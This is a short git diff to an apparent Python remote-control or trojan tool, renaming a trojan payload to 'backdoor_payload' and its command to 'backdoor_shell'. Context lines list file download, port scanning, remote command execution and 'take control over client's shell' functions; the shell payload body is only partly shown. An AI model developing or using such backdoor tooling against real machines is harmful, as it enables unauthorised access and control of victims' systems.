@@ -37,7 +37,7 @@ else:
 ce_payload =""""""
 
 # took troj_payload from https://github.com/Metallicode/pythonCourse3.6.5
-troj_payload = """
+backdoor_payload = """
 import socket
 import subprocess
 import os
@@ -95,7 +95,7 @@ for key in results:
 d_args      = ['enter filepath:', 'enter filename']
 p_args      = ["check single port:"]
 ce_args     = ["enter single exe command:"]
-troj_args   = ["enter port to take control over client's shell:"]
+bs_args     = ["enter port to take control over client's shell:"]
 ###############################################################
 
 
@@ -104,9 +104,9 @@ download_file   = command(payload=d_payload, type='download_file', args_to_ask=d
 ports_scan      = command(payload=ports_payload, type='ports_scan', args_to_ask=[])
 one_port_scan   = command(payload=p_payload, type='one_port_scan', args_to_ask=p_args)
 cmd_exe         = command(payload=ce_payload, type='cmd_exe', args_to_ask=ce_args)
-troj_horse      = command(payload=troj_payload, type='take_shell', args_to_ask=troj_args)
+backdoor_shell      = command(payload=backdoor_payload, type='take_shell', args_to_ask=bs_args)
 
-commands_list  = [download_file, ports_scan, one_port_scan, cmd_exe, troj_horse]
+commands_list  = [download_file, ports_scan, one_port_scan, cmd_exe, backdoor_shell]
 
 
 
